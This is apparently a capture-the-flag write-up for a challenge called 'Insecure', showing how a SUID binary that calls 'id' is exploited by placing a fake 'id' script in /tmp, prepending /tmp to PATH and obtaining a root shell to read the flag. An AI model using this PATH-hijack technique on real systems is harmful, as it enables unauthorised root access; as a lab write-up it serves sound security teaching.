---
description: Privilege escalation through SUID files and PATH variable manipulation
---

# Insecure \(100\)

## Problem

Someone once told me that SUID is a bad idea. Could you show me why?

{% file src="../../.gitbook/assets/insecure.bin" %}

## Solution

The binary calls the `id` command three times, first without privileges, then as root, then again without privileges.

Since the SUID flag is set, we can manipulate the PATH variable to execute arbitrary code when `id` is called. The goal is to read the `flag.txt` file which requires root access. Thus, we need to spawn a shell as root. 

The following bash script will only spawn the shell if the caller is root.

```bash
if [ `/bin/id -u` = "0" ]; then 
    echo "I am root" && /bin/bash
else 
    echo "I am not root"
fi
```

Translating this into a one liner and creating our malicious `id` payload:

```bash
$ echo "if [ \`/bin/id -u\` = \"0\" ]; then echo \"I am root\" && /bin/bash; else echo \"I am not root\"; fi" > id
```

PATH variable manipulation:

```bash
$ cd /tmp
$ echo "if [ \`/bin/id -u\` = \"0\" ]; then echo \"I am root\" && /bin/bash; else echo \"I am not root\"; fi" > id
$ chmod 777 id
$ export PATH=/tmp:$PATH
```

After running `insecure`, we obtain a root shell:

```bash
I am not root
I am root

$ cat /flag.txt
DSO-NUS{b4fcfe57b8d2b05ff3310c663a0497b1026cf039baeee18669957152cdc276da}
```

